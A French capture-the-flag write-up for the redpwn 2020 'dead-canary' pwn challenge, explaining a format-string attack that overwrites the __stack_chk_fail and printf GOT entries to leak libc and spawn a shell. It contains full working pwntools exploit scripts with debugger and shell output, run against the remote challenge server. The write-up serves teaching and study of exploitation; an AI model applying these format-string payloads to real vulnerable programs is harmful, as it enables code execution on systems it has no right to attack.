---
author: Flo
---

# Dead-canary (pwn)

*tldr: ce challenge consiste à utiliser une vulnérabilité de type format string pour réécrire deux entrées dans la GOT (printf et __stack_chk_fail) afin de pouvoir éxécuter systeme et obtenir un shell.*

## Reconnaissance

Les fichiers suivants nous sont fournis:

```
$ tree
.
├── bin
│   ├── dead-canary
│   └── flag.txt
├── ctf.xinetd
├── Dockerfile
└── start.sh
```

Le Dockerfile nous donne la version de linux utilisé pour l'envirronement et ainsi la version de la libc, ma machine tournant aussi sous Ubuntu 18.04, je n'ai donc pas à changer la version de la libc.

```
$ head Dockerfile 
FROM ubuntu:18.04
```

Le binaire est compilé avec les protections NX, et stack canary, pas de full RELRO, ou de PIE (ouf ^^')

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

On éxécute le programme : 

```
$ ./dead-canary 
What is your name: imflo
Hello imflo
```

Ok, notre entrée est renvoyé. 

Apres plusieurs essaye on ne vois pas de buffer overflow, mais on constate une injection de format string.

```
$ ./dead-canary 
What is your name: %p, %p, %p
Hello 0x7fffffffb7d0, 0x7ffff7dd18c0, (nil)
```

## Exploitation

L'exploitation de ce programme peut se diviser en 5 phases:
1. réécrire l'entré de la fonction `__stack_chk_fail` dans la GOT pour boucler sur le main (faire un appel récurssif)
2. leaker une adresse de la libc pour déterminer l'adresse de base de la libc
3. boucler sur le `main` et réécrire l'entré de `printf` dans la GOT par l'adresse de la fonction `system` que nous aurons déterminer à partir de l'adresse de base de la libc.
4. Envoyer `/bin/sh` dans le buffer et ainsi lorsque celui-ci sera passer à `printf` nous aurons notre shell.
5. Tripel Karmeliet

### __stack_chk_fail et leak libc

Le programme étant compilé avec des stack cookies, il ne nous ai théoriquement pas possible de faire un overflow, sauf si nous arrivons à remettre le cookie sur la stack (ce qui dans notre cas serai possible, grâce à la format string), mais comme le programme n'a pas de FULL-RELRO, nous pouvons alors réécrire la GOT et tirer avantage de la fonction `__stack_chk_fail` qui est appeler lorsque le cookie est invalide en fin de fontion, en remplacant son adresse par l'adresse d'une autre fonction qui nous arrange plus.

```c
int main(void)
{
  long in_FS_OFFSET;
  char buffer [264];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28); 
  printf("What is your name: ");
  _fgets(0,buffer,0x120);
  printf("Hello ");
  printf(buffer);
  
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
      // si le canary est invalide
      __stack_chk_fail();
  }
  return 0;
}
```

Pour réécrire une adresse gràce a une format string, on peut utiliser le formatteur `%n` qui écris le nombre de caratère déjà imprimé à l'adresse fourni en paramètre (pour rappel: si aucun paramètre n'est fournie, printf utilisera ce qui se trouve sur la stack, la chaine de caractère que nous lui envoyons se trouvant aussi sur la stack nous pouvons lui donner une chaine du type : `AAAAAAAA%8$n\x00XXX<adresse>` et ainsi écrire 8 à l'adresse que nous lui fournirons).

```
pwndbg> start
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 6
 
[0x601018] _exit@GLIBC_2.2.5 -> 0x4005f6 (_exit@plt+6) ◂— push   0 /* 'h' */
[0x601020] write@GLIBC_2.2.5 -> 0x400606 (write@plt+6) ◂— push   1
[0x601028] __stack_chk_fail@GLIBC_2.4 -> 0x400616 (__stack_chk_fail@plt+6) ◂— push   2
[0x601030] setbuf@GLIBC_2.2.5 -> 0x400626 (setbuf@plt+6) ◂— push   3
[0x601038] printf@GLIBC_2.2.5 -> 0x400636 (printf@plt+6) ◂— push   4
[0x601040] read@GLIBC_2.2.5 -> 0x400646 (read@plt+6) ◂— push   5

pwndbg> b* 0x004007e1
pwndbg> r < <(python -c 'print "AAAAAAAA%8$n\x00BBB(\x10`\x00\x00\x00\x00\x00"')
What is your name: Hello AAAAAAAA
Breakpoint 2, 0x00000000004007e1 in ?? ()

pwndbg> got

GOT protection: Partial RELRO | GOT functions: 6
 
[0x601018] _exit@GLIBC_2.2.5 -> 0x4005f6 (_exit@plt+6) ◂— push   0 /* 'h' */
[0x601020] write@GLIBC_2.2.5 -> 0x400606 (write@plt+6) ◂— push   1
[0x601028] __stack_chk_fail@GLIBC_2.4 -> 0x8
[0x601030] setbuf@GLIBC_2.2.5 -> 0x7ffff7a6c4d0 (setbuf) ◂— mov    edx, 0x2000
[0x601038] printf@GLIBC_2.2.5 -> 0x7ffff7a48e80 (printf) ◂— sub    rsp, 0xd8
[0x601040] read@GLIBC_2.2.5 -> 0x7ffff7af4070 (read) ◂— lea    rax, [rip + 0x2e0881]
```

Ici nous avons réécris l'entré de `__stack_chk_fail` avec 8 via la format string.

Cependant pour pouvoir boucler sur le main, nous devons remplacer cette entré par `0x00400737`, ce qui signifierai écrire 4 196 151 caractères, ce qui serait LOOOOOOOONNNNNNNGGGGGGGG! (et de plus notre buffer ne fait que 264 caractères).

Nous devons alors tiré avantage du modificateur de padding de printf, c'est à dire que si nous envoyons : `%020x` à printf il nous affichera : `00000000000000000001`.

Et du modificateur de longeur `hn` qui permet de n'écrire que un short (2 bytes).

De ce fait pour écrire `0x400737` à l'adresse `0x601028`, nous ferons deux écriture:
1. d'abord `0x40` à `0x60102A`
2. ensuite `0x737` à l'adresse `0x601028`

De plus nous devons lire une entré de la GOT pour récupérer une adresse de la libc et calculer son de base.

Pour ca, il suffit de faire un `%n$s\x00AAA<addr printf>` et de lire la sortie:

```
pwndbg> r < <(python -c 'print "%7$s\x00AAA8\x10`\x00\x00\x00\x00\x00"')
What is your name: Hello �����
```

Donc pour le moment, nous avons l'exploit suivant, qui nous donne l'adresse de base de la libc, et fais boucler le programme sur le main.

```python
from pwn import *

elf = ELF("./dead-canary")
libc = elf.libc

p = process(elf.path)
p.recvuntil(": ")

fmt = "%064x"
fmt += "%11$n" 
fmt += "%01783x"
fmt += "%12$hn"
fmt += "%13$s"
fmt += "BBBBBBBBBBB\x00"
fmt += p64(elf.got.__stack_chk_fail + 2)
fmt += p64(elf.got.__stack_chk_fail)
fmt += p64(elf.got.printf) 
fmt += "C"*(272-len(fmt))

log.info("payload size : %s" % str(len(fmt)))
log.info("payload : %s" % fmt)

p.sendline(fmt)
data =  p.recvuntil(":")

data = data.strip().split("BBBB")[0].split("0")[-1]
l_printf = u64(data.ljust(8, "\x00"))
b_libc = l_printf - libc.sym.printf
libc.address = b_libc

log.info("leak printf: %s" % hex(l_printf))
log.info("leak libc  : %s" % hex(b_libc))
log.info("leak system: %s" % hex(libc.sym.system))

p.interactive()
```

sortie:
```
$ python stage1.py 
[+] Starting local process '/.../CTF/redpwn/2020/pwn/dead-canary/bin/dead-canary': pid 14813
[*] payload size : 272
[*] payload : %064x%11$n%01783x%12$hn%13$sBBBBBBBBBBB\x00\x10\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00CC[...]C
[*] leak printf: 0x7ffff7a48e80
[*] leak libc  : 0x7ffff79e4000
[*] leak system: 0x7ffff7a33440
[*] Switching to interactive mode
 $ foo
Hello foo
\xff\x7f[*] Process '/.../CTF/redpwn/2020/pwn/dead-canary/bin/dead-canary' stopped with exit code 0 (pid 14813)
[*] Got EOF while reading in interactive
[*] Interrupted
```

### Appel à system et obtention d'un shell

Comme la première parti, nous tirons avantage de la format string pour réécrire l'entrée de `printf` dans la GOT par l'adresse de la fonction `system` que nous avons calculer grace au leak de la libc.

On redéclenchera alors un overflow sur le cookie, ce qui appelera le main via `__stack_chk_fail` et nous pourrons alors saisir `/bin/sh` dans le buffer qui sera passer à `system` via la réécriture de `printf` dans la GOT et ainsi déclenchera notre shell.

Il s'agit exactement de la même technique, je vais donc juste mettre à jour mon exploit:

```python
from pwn import *

elf = ELF("./dead-canary")
libc = elf.libc

p = process(elf.path)
p.recvuntil(": ")

log.warning("stage #1 : leaks.")
log.info("__stack_chk_fail: %s" % hex(elf.got.__stack_chk_fail))

fmt = "%064x"
fmt += "%11$n" 
fmt += "%01783x"
fmt += "%12$hn"
fmt += "%13$s"
fmt += "BBBBBBBBBBB\x00"
fmt += p64(elf.got.__stack_chk_fail + 2)
fmt += p64(elf.got.__stack_chk_fail)
fmt += p64(elf.got.printf) 
fmt += "C"*(272-len(fmt))

log.info("payload size : %s" % str(len(fmt)))
log.info("payload : %s" % fmt)

p.sendline(fmt)
data =  p.recvuntil(":")

data = data.strip().split("BBBB")[0].split("0")[-1]
l_printf = u64(data.ljust(8, "\x00"))
b_libc = l_printf - libc.sym.printf
libc.address = b_libc

log.info("leak printf: %s" % hex(l_printf))
log.info("leak libc  : %s" % hex(b_libc))
log.info("leak system: %s" % hex(libc.sym.system))

log.warning("stage #2 : exploitation.")

log.info("two write to make:")

first_write = int(hex(libc.sym.system)[-2:], 16)
second_write = int(hex(libc.sym.system)[-6:-2], 16)

log.info("1. [%s] => %s (%s)" % (hex(elf.got.printf), str(first_write), hex(first_write)))
log.info("2. [%s] => %s (%s)" % (hex(elf.got.printf +1), str(second_write), hex(second_write)))

exp = "%0{}x".format(first_write) 
exp += "%10$hn"
exp += "%0{}x".format(second_write - first_write)
exp += "%11$hn"
exp += "Z"*(31 - len(exp)) + "\x00"
exp += p64(elf.got.printf)
exp += p64(elf.got.printf + 1)
exp += "B"* (276 - len(exp))
exp += "AAAA" # just overwrite the stack canary 

p.sendline(exp)
p.sendline("/bin/sh")
p.interactive()
```

et si nous le lançons:
```
$ python exploit_v2.py 
[+] Starting local process '/.../CTF/redpwn/2020/pwn/dead-canary/bin/dead-canary': pid 14990
[!] stage #1 : leaks.
[*] __stack_chk_fail: 0x601028
[*] payload size : 272
[*] payload : %064x%11$n%01783x%12$hn%13$sBBBBBBBBBBB\x00\x10\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
[*] leak printf: 0x7ffff7a48e80
[*] leak libc  : 0x7ffff79e4000
[*] leak system: 0x7ffff7a33440
[!] stage #2 : exploitation.
[*] two write to make:
[*] 1. [0x601038] => 64 (0x40)
[*] 2. [0x601039] => 41780 (0xa334)
[*] Switching to interactive mode
 Hello 000000[...]00f7dd18c0ZZZZZZsh: 1: What: not found
sh: 1: Hello: not found
$ cat flag.txt
imflo{this_is_a_plaholder_flag}
$ 
[*] Interrupted
```

Victoire, nous avon un shell en local ! Et en remote ?

```
$ python exploit_v2.py REMOTE
[+] Opening connection to 2020.redpwnc.tf on port 31744: Done
[!] stage #1 : leaks.
[*] __stack_chk_fail: 0x601028
[*] payload size : 272
[*] payload : %064x%11$n%01783x%12$hn%13$sBBBBBBBBBBB\x00\x10\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
[*] leak printf: 0x7fcae602ee80
[*] leak libc  : 0x7fcae5fca000
[*] leak system: 0x7fcae6019440
[!] stage #2 : exploitation.
[*] two write to make:
[*] 1. [0x601038] => 64 (0x40)
[*] 2. [0x601039] => 404 (0x194)
[*] Switching to interactive mode
 Hello 000[...]00e63b78c0ZZZZZZZZsh: 1: What: not found
sh: 1: Hello: not found
$ cat flag.txt
flag{t0_k1ll_a_canary_4e47da34}
$ 
[*] Interrupted
```

![](https://media.giphy.com/media/xUA7aQOxkz00lvCAOQ/giphy.gif)